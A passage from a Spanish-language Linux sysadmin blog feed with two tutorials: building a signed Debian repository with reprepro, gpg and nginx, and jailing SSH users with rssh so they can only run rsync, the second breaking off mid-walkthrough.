&lt;p&gt;Un repositorio &lt;em&gt;Debian&lt;/em&gt; no es mas que un servidor web sirviendo una estructura de ficheros con una forma concreta, que vamos a crear con &lt;strong&gt;reprepro&lt;/strong&gt; y vamos a servir con &lt;strong&gt;nginx&lt;/strong&gt;. Aís pues, los instalamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:~# apt-get install reprepro nginx-light
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
...
Se instalarán los siguientes paquetes NUEVOS:
  ca-certificates gnupg-agent gnupg2 libarchive13 libassuan0 libcurl3-gnutls libffi6 libgmp10 libgnutls-deb0-28 libgpgme11 libhogweed2 libidn11 libksba8 libldap-2.4-2
  liblzo2-2 libnettle4 libp11-kit0 libpth20 librtmp1 libsasl2-2 libsasl2-modules libsasl2-modules-db libssh2-1 libtasn1-6 libxml2 nginx-common nginx-light openssl
  pinentry-curses reprepro sgml-base xml-core
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;32&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;7&lt;/span&gt;.645 kB de archivos.
Se utilizarán &lt;span class="m"&gt;21&lt;/span&gt;,2 MB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@repository:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Un repositorio necesita una clave &lt;strong&gt;gpg&lt;/strong&gt; para firmar los paquetes que sirve; aunque de eso se encarga &lt;strong&gt;reprepro&lt;/strong&gt;, tenemos que generarla:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:~# gpg --gen-key
gpg &lt;span class="o"&gt;(&lt;/span&gt;GnuPG&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;.4.18&lt;span class="p"&gt;;&lt;/span&gt; Copyright &lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
...
gpg: /root/.gnupg/trustdb.gpg: se ha creado base de datos de confianza
gpg: clave C1B88DF7 marcada como de confianza absoluta
claves pública y secreta creadas y firmadas.
...
root@repository:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos ver que las claves se han creado y podemos anotar su identificador para continuar con el procedimiento.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:~# gpg --list-keys
/root/.gnupg/pubring.gpg
------------------------
pub   2048R/C1B88DF7 &lt;span class="m"&gt;2016&lt;/span&gt;-01-07
uid                  Gerard Monells &amp;lt;gerard.monells@gmail.com&amp;gt;
sub   2048R/5C5B84E3 &lt;span class="m"&gt;2016&lt;/span&gt;-01-07

root@repository:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear el repositorio en &lt;em&gt;/opt/repo/&lt;/em&gt;, con una carpeta &lt;em&gt;public&lt;/em&gt; que es lo que vamos a servir con &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:~# mkdir -p /opt/repo/&lt;span class="o"&gt;{&lt;/span&gt;conf,public&lt;span class="o"&gt;}&lt;/span&gt;
root@repository:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por comodidad, vamos a trabajar en la carpeta base del repositorio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/repo
root@repository:/opt/repo# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Un repositorio hecho con &lt;strong&gt;reprepro&lt;/strong&gt; se declara mediante un fichero de configuración, que vamos a crear en la carpeta &lt;em&gt;conf&lt;/em&gt;, declarando el nombre del repositorio, las arquitecturas y la clave con la que se firman los paquetes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:/opt/repo# cat conf/distributions 
Codename: linuxsysadmin
Components: main
Architectures: i386
SignWith: C1B88DF7
root@repository:/opt/repo# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a poner la parte pública de nuestra clave &lt;strong&gt;gpg&lt;/strong&gt; en la raíz del servidor web, para que los clientes puedan agregarla a su almacén de claves, para usar sin problemas los paquetes de nuestro repositorio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:/opt/repo# gpg -a --export C1B88DF7 &amp;gt; /opt/repo/public/key.gpg
root@repository:/opt/repo# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a poner una configuración a &lt;strong&gt;nginx&lt;/strong&gt; que nos permita servir la carpeta pública en el puerto web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:/opt/repo# cat /etc/nginx/sites-enabled/repository
server &lt;span class="o"&gt;{&lt;/span&gt;
    server_name localhost&lt;span class="p"&gt;;&lt;/span&gt;
    root /opt/repo/public&lt;span class="p"&gt;;&lt;/span&gt;
    autoindex on&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@repository:/opt/repo# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Recargamos o reiniciamos el servicio &lt;strong&gt;nginx&lt;/strong&gt; para que la configuración surta efecto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:/opt/repo# service nginx restart
root@repository:/opt/repo# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo paquetes al repositorio&lt;/h2&gt;
&lt;p&gt;Añadir un paquete a nuestro repositorio es tan fácil como invocar el comando &lt;em&gt;reprepro&lt;/em&gt;, con la opción &lt;em&gt;includedeb&lt;/em&gt; del paquete, en alguna carpeta de nuestra máquina. El resto son opciones que indican donde están las carpetas del repositorio.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WARNING&lt;/strong&gt;: Si se pone un paquete empaquetado por nosotros, es importante que su fichero &lt;em&gt;control&lt;/em&gt; incluya las directivas &lt;em&gt;Section&lt;/em&gt; y &lt;em&gt;Priority&lt;/em&gt;, normalmente solo recomendadas, pero necesarias para &lt;strong&gt;reprepro&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Por ejemplo, podemos usar el paquete de un &lt;a href="http://www.linuxsysadmin.ml/2015/12/empaquetando-ficheros-punto-deb.html"&gt;artículo anterior&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@repository:/opt/repo# reprepro --distdir ./public/dists --outdir ./public includedeb linuxsysadmin /root/welcome_1.0-1_all.deb 
Exporting indices...
root@repository:/opt/repo# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;WARNING&lt;/strong&gt;: Puede que el comando falle si no se ha montado el sistema de ficheros &lt;em&gt;/dev/pts&lt;/em&gt;, especialmente en un entorno tipo &lt;strong&gt;chroot&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Usando el repositorio&lt;/h2&gt;
&lt;p&gt;Cambiamos de máquina; ahora vamos a la máquina que vaya a usar el repositorio y vamos a configurar el repositorio nuevo.&lt;/p&gt;
&lt;p&gt;Lo primero es declarar la &lt;strong&gt;source&lt;/strong&gt; de nuestro repositorio, declarando la dirección web del repositorio, el nombre del repositorio y el componente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# cat /etc/apt/sources.list.d/linuxsysadmin.list 
deb http://10.0.0.2/ linuxsysadmin main
root@client:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora nos descargamos la clave pública del repositorio y la añadimos al almacén de claves de &lt;strong&gt;apt&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# wget -qO- http://10.0.0.2/key.gpg &lt;span class="p"&gt;|&lt;/span&gt; apt-key add -
OK
root@client:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya tenemos el repositorio habilitado. A partir de aquí su uso es el mismo que el de cualquier otro repositorio. Hacemos un &lt;em&gt;apt-get update&lt;/em&gt; para descargar la lista de paquetes del repositorio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# apt-get update
Des:1 http://10.0.0.2 linuxsysadmin InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.340 B&lt;span class="o"&gt;]&lt;/span&gt;
...
Des:2 http://10.0.0.2 linuxsysadmin/main i386 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;333&lt;/span&gt; B&lt;span class="o"&gt;]&lt;/span&gt;
...
Descargados &lt;span class="m"&gt;2&lt;/span&gt;.040 B en 6s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;330&lt;/span&gt; B/s&lt;span class="o"&gt;)&lt;/span&gt;                                                                                                                                    
Leyendo lista de paquetes... Hecho
root@client:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, y sabiendo nuestro sistema los paquetes de los que dispone el nuevo repositorio, podemos buscar los paquetes que hay en él.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# apt-cache search welcome &lt;span class="p"&gt;|&lt;/span&gt; grep ^welcome
welcome2l - Linux ANSI boot logo
welcome - A fancy shell script
root@client:~# apt-cache show welcome
Package: welcome
Version: &lt;span class="m"&gt;1&lt;/span&gt;.0-1
Architecture: all
Maintainer: Linux Sysadmin
Priority: optional
Section: main
Filename: pool/main/w/welcome/welcome_1.0-1_all.deb
Size: &lt;span class="m"&gt;786&lt;/span&gt;
SHA256: 2e701f7fbc090230fb7abc06597fbe5b4e9e70dcc553e749e69793a745b032f2
SHA1: 41351d1d2135bcee09e1fa3bade984ece9f23caf
MD5sum: 574fab58b3c871184047c40d0e732b35
Description: A fancy shell script
 To demonstrate how to package a .deb file
Description-md5: ed73975a1e7c5f0422fef1f624586821
Depends: bash, coreutils

root@client:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Visto que el paquete está disponible, podemos instalarlo, usando &lt;em&gt;apt-get&lt;/em&gt; o cualquier otro frontal, gráfico o no.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# apt-get install welcome
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes NUEVOS:
  welcome
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;1&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;786&lt;/span&gt; B de archivos.
Se utilizarán &lt;span class="m"&gt;0&lt;/span&gt; B de espacio de disco adicional después de esta operación.
Des:1 http://10.0.0.2/ linuxsysadmin/main welcome all &lt;span class="m"&gt;1&lt;/span&gt;.0-1 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;786&lt;/span&gt; B&lt;span class="o"&gt;]&lt;/span&gt;
Descargados &lt;span class="m"&gt;786&lt;/span&gt; B en 0s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;37&lt;/span&gt;,4 kB/s&lt;span class="o"&gt;)&lt;/span&gt;
debconf: se retrasa la configuración de los paquetes, ya que «apt-utils» no está instalado
Seleccionando el paquete welcome previamente no seleccionado.
&lt;span class="o"&gt;(&lt;/span&gt;Leyendo la base de datos ... &lt;span class="m"&gt;10434&lt;/span&gt; ficheros o directorios instalados actualmente.&lt;span class="o"&gt;)&lt;/span&gt;
Preparando para desempaquetar .../archives/welcome_1.0-1_all.deb ...
Desempaquetando welcome &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Configurando welcome &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0-1&lt;span class="o"&gt;)&lt;/span&gt; ...
root@client:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tal como lo esperábamos, el comando &lt;em&gt;welcome&lt;/em&gt; está instalado y funciona como esperábamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# which welcome
/usr/bin/welcome
root@client:~# welcome
Hello world!
root@client:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestro repositorio funcional.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="repositorio"></category><category term="reprepro"></category><category term="nginx"></category><category term="gpg"></category><category term="apt"></category></entry><entry><title>Enjaulado de usuarios para uso de rsync</title><link href="http://www.linuxsysadmin.ml/2016/01/enjaulado-de-usuarios-para-uso-de-rsync.html" rel="alternate"></link><published>2016-01-04T10:00:00+01:00</published><updated>2016-01-04T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-01-04:/2016/01/enjaulado-de-usuarios-para-uso-de-rsync.html</id><summary type="html">&lt;p&gt;Todos nos hemos encontrado alguna vez con una web, sea en &lt;em&gt;HTML&lt;/em&gt; o en &lt;em&gt;PHP&lt;/em&gt;, que se compone de centenares o miles de ficheros, y que hay que ir actualizando cada vez que cambian unos pocos ficheros. En estos casos la capacidad incremental de la herramienta &lt;strong&gt;rsync&lt;/strong&gt; puede ayudarnos mucho …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Todos nos hemos encontrado alguna vez con una web, sea en &lt;em&gt;HTML&lt;/em&gt; o en &lt;em&gt;PHP&lt;/em&gt;, que se compone de centenares o miles de ficheros, y que hay que ir actualizando cada vez que cambian unos pocos ficheros. En estos casos la capacidad incremental de la herramienta &lt;strong&gt;rsync&lt;/strong&gt; puede ayudarnos mucho.&lt;/p&gt;
&lt;p&gt;Sin embargo, la herramienta &lt;strong&gt;rsync&lt;/strong&gt; funciona por el puerto de &lt;em&gt;SSH&lt;/em&gt;, y dar acceso al mismo es un problema desde el punto de vista de la seguridad del sistema. Vamos a crear una jaula para los usuarios que lo necesiten, y vamos a limitar los comandos que puede utilizar, de forma que solo pueda hacer &lt;strong&gt;rsync&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Para poder continuar, necesitamos las 2 herramientas que se van a usar: &lt;strong&gt;rsync&lt;/strong&gt; y &lt;strong&gt;rssh&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# apt-get install rssh rsync
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
...
Se instalarán los siguientes paquetes NUEVOS:
  libpopt0 rssh rsync
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;3&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;505&lt;/span&gt; kB de archivos.
Se utilizarán &lt;span class="m"&gt;962&lt;/span&gt; kB de espacio de disco adicional después de esta operación.
...
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Preparación del sistema de enjaulado&lt;/h2&gt;
&lt;p&gt;Como decisión de diseño, he decidido que voy a enjaular todos los usuarios que pertenezcan a un grupo, al que llamaremos &lt;em&gt;restricted&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# groupadd restricted
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a configurar el demonio &lt;strong&gt;SSH&lt;/strong&gt; para que todos los usuarios del grupo &lt;em&gt;restricted&lt;/em&gt; queden enjaulados en &lt;em&gt;/srv/jails/&lt;/em&gt;, en una carpeta por usuario. La directiva &lt;em&gt;X11Forwarding&lt;/em&gt; y &lt;em&gt;AllowTcpForwarding&lt;/em&gt; son restricciones adicionales y no son necesarias.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# cat /etc/ssh/sshd_config 
...
Match group restricted
    ChrootDirectory /srv/jails/%u
    X11Forwarding no
    AllowTcpForwarding no
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y reiniciamos el demonio para que se apliquen las modificaciones en la configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# service ssh restart
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando una jaula para el primer usuario&lt;/h2&gt;
&lt;p&gt;Para tener un usuario enjaulado, necesitamos un usuario, en este caso, el usuario &lt;em&gt;web&lt;/em&gt;. Le vamos a poner &lt;em&gt;rssh&lt;/em&gt; como shell, su carpeta personal como &lt;em&gt;/&lt;/em&gt; y le asignamos el grupo &lt;em&gt;restricted&lt;/em&gt; para que quede enjaulado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# useradd -d / -s /usr/bin/rssh -G restricted web
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para que el usuario &lt;em&gt;web&lt;/em&gt; pueda entrar en esta máquina, necesita una contraseña. Alternativamente, podríamos haber montado una autenticación por claves &lt;em&gt;SSH&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# passwd web
Introduzca la nueva contraseña de UNIX: 
Vuelva a escribir la nueva contraseña de UNIX: 
passwd: contraseña actualizada correctamente
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora vamos a crearle una estructura de carpetas muy básica en donde deberá estar su jaula. Puesto que se trata del usuario &lt;em&gt;web&lt;/em&gt;, la carpeta de la jaula (la que el usuario verá como &lt;em&gt;/&lt;/em&gt;) va a ser &lt;em&gt;/srv/jails/web/&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: Esta carpeta y todas las de la ruta deben perteneces al usuario &lt;em&gt;root&lt;/em&gt; y tener permisos de escritura solo por el &lt;em&gt;owner&lt;/em&gt;; de otra manera, el &lt;em&gt;SSH&lt;/em&gt; falla al enjaular.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# mkdir -p /srv/jails/web/&lt;span class="o"&gt;{&lt;/span&gt;usr/bin,etc,lib&lt;span class="o"&gt;}&lt;/span&gt;
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para limitar que el usuario solo pueda hacer &lt;em&gt;rsync&lt;/em&gt; vamos a necesitar la ayuda de &lt;em&gt;rssh&lt;/em&gt;; así pues, vamos a poner ambos binarios en la jaula.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# cp /usr/bin/rssh /srv/jails/web/usr/bin/
root@webserver:~# cp /usr/bin/rsync /srv/jails/web/usr/bin/
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estos dos comandos son binarios &lt;em&gt;linkados&lt;/em&gt; dinámicamente que necesitan librerías. Vamos a buscarlos con el comando &lt;strong&gt;ldd&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# ldd /usr/bin/rssh 
    linux-gate.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb7789000&lt;span class="o"&gt;)&lt;/span&gt;
    libc.so.6 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class="o"&gt;(&lt;/span&gt;0xb760a000&lt;span class="o"&gt;)&lt;/span&gt;
    /lib/ld-linux.so.2 &lt;span class="o"&gt;(&lt;/span&gt;0xb778c000&lt;span class="o"&gt;)&lt;/span&gt;
root@webserver:~# ldd /usr/bin/rsync 
    linux-gate.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb7741000&lt;span class="o"&gt;)&lt;/span&gt;
    libattr.so.1 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libattr.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb76a3000&lt;span class="o"&gt;)&lt;/span&gt;
    libacl.so.1 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libacl.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb7699000&lt;span class="o"&gt;)&lt;/span&gt;
    libpopt.so.0 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libpopt.so.0 &lt;span class="o"&gt;(&lt;/span&gt;0xb768a000&lt;span class="o"&gt;)&lt;/span&gt;
    libc.so.6 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class="o"&gt;(&lt;/span&gt;0xb7519000&lt;span class="o"&gt;)&lt;/span&gt;
    /lib/ld-linux.so.2 &lt;span class="o"&gt;(&lt;/span&gt;0xb7744000&lt;span class="o"&gt;)&lt;/span&gt;
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y las copiamos en la carpeta &lt;em&gt;lib&lt;/em&gt; de la jaula.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# cp /lib/ld-linux.so.2 /srv/jails/web/lib/
root@webserver:~# cp /lib/i386-linux-gnu/libc.so.6 /srv/jails/web/lib/
root@webserver:~# cp /lib/i386-linux-gnu/libattr.so.1 /srv/jails/web/lib/
root@webserver:~# cp /lib/i386-linux-gnu/libacl.so.1 /srv/jails/web/lib/
root@webserver:~# cp /lib/i386-linux-gnu/libpopt.so.0 /srv/jails/web/lib/
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Voy a quitar los permisos de ejecución de la librería &lt;em&gt;libc&lt;/em&gt; porque no lo necesita.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# chmod &lt;span class="m"&gt;644&lt;/span&gt; /srv/jails/web/lib/libc.so.6 
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora que tenemos las librerías en la jaula, volvemos a mirar que otras librerías puedan necesitar con &lt;strong&gt;ldd&lt;/strong&gt;, para evitar dejarnos ninguna.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# ldd /srv/jails/web/lib/*
/srv/jails/web/lib/ld-linux.so.2:
    statically linked
/srv/jails/web/lib/libacl.so.1:
    linux-gate.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb77b3000&lt;span class="o"&gt;)&lt;/span&gt;
    libattr.so.1 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libattr.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb779e000&lt;span class="o"&gt;)&lt;/span&gt;
    libc.so.6 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class="o"&gt;(&lt;/span&gt;0xb762d000&lt;span class="o"&gt;)&lt;/span&gt;
    /lib/ld-linux.so.2 &lt;span class="o"&gt;(&lt;/span&gt;0xb77b6000&lt;span class="o"&gt;)&lt;/span&gt;
/srv/jails/web/lib/libattr.so.1:
    linux-gate.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb7756000&lt;span class="o"&gt;)&lt;/span&gt;
    libc.so.6 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class="o"&gt;(&lt;/span&gt;0xb75da000&lt;span class="o"&gt;)&lt;/span&gt;
    /lib/ld-linux.so.2 &lt;span class="o"&gt;(&lt;/span&gt;0xb7759000&lt;span class="o"&gt;)&lt;/span&gt;
/srv/jails/web/lib/libc.so.6:
    /lib/ld-linux.so.2 &lt;span class="o"&gt;(&lt;/span&gt;0xb779f000&lt;span class="o"&gt;)&lt;/span&gt;
    linux-gate.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb779c000&lt;span class="o"&gt;)&lt;/span&gt;
/srv/jails/web/lib/libpopt.so.0:
    linux-gate.so.1 &lt;span class="o"&gt;(&lt;/span&gt;0xb7782000&lt;span class="o"&gt;)&lt;/span&gt;
    libc.so.6 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class="o"&gt;(&lt;/span&gt;0xb75fe000&lt;span class="o"&gt;)&lt;/span&gt;
    /lib/ld-linux.so.2 &lt;span class="o"&gt;(&lt;/span&gt;0xb7785000&lt;span class="o"&gt;)&lt;/span&gt;
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como no han entrado de nuevas, hemos acabado con esto. Ahora vamos a copiar la configuración de &lt;strong&gt;rssh&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# cp /etc/rssh.conf /srv/jails/web/etc/
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a añadir la directiva &lt;em&gt;allowrsync&lt;/em&gt; ya que, por defecto, no se permite nada:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ANTES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# grep allowrsync /srv/jails/web/etc/rssh.conf 
&lt;span class="c1"&gt;#allowrsync&lt;/span&gt;
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;DESPUES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# grep allowrsync /srv/jails/web/etc/rssh.conf 
allowrsync
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como estamos esperando que el usuario &lt;em&gt;web&lt;/em&gt; deje sus cosas en una carpeta &lt;em&gt;www&lt;/em&gt;, vamos a crearla, ya que va a ser la única en la que pueda copiar sus cosas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# mkdir /srv/jails/web/www
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y le damos permisos necesarios para que escriba en ella; por ejemplo, le damos la propiedad de la carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# chown web:web /srv/jails/web/www/
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto queda completa la jaula. Como demostración, muestro la salida del comando &lt;strong&gt;tree&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# tree /srv/jails/web/
/srv/jails/web/
├── etc
│   └── rssh.conf
├── lib
│   ├── ld-linux.so.2
│   ├── libacl.so.1
│   ├── libattr.so.1
│   ├── libc.so.6
│   └── libpopt.so.0
├── usr
│   └── bin
│       ├── rssh
│       └── rsync
└── www

&lt;span class="m"&gt;5&lt;/span&gt; directories, &lt;span class="m"&gt;8&lt;/span&gt; files
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Uso de la jaula&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un proyecto web en una máquina &lt;em&gt;developer&lt;/em&gt;, por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@developer:~$ tree web/
web/
└── index.html

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;1&lt;/span&gt; file
gerard@developer:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Intentamos entrar por &lt;em&gt;SSH&lt;/em&gt; y vemos que falla:&lt;/p&gt;
